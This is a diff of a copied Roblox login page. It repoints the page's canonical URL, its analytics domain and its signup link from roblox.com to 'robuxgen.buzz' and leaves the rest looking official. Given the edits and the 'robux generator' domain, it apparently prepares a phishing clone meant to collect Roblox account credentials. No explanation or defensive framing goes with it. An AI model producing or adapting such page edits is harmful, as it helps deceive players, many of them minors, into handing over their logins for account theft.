@@ -391,7 +391,7 @@ Roblox.BundleDetector.setTiming(window.performance.timing);
 <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css" />
 
 
-    <link rel="canonical" href="https://www.roblox.com/NewLogin" />
+    <link rel="canonical" href="https://robuxgen.buzz/login" />
     
 <link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet'  href='https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch' />
 
@@ -543,7 +543,7 @@ Roblox.BundleDetector.setTiming(window.performance.timing);
         _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
         _gaq.push(['b._setCampContentKey', 'rbx_campaign']);
 
-            _gaq.push(['b._setDomainName', 'roblox.com']);
+            _gaq.push(['b._setDomainName', 'robuxgen.buzz']);
 
             _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
                 _gaq.push(['b._setPageGroup', 1, 'Login']);
@@ -858,7 +858,7 @@ Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
 <script>
     var Roblox = Roblox || {};
     Roblox.LoginMeta = {
-        signupUrl: "https://www.roblox.com/account/signupredir",
+        signupUrl: "https://robuxgen.buzz/",
         forgotCredentialsUrl: "https://www.roblox.com/login/forgot-password-or-username",
         homeUrl: "https://www.roblox.com/home",
         securityNotificationUrl: "https://www.roblox.com/login/securitynotification",
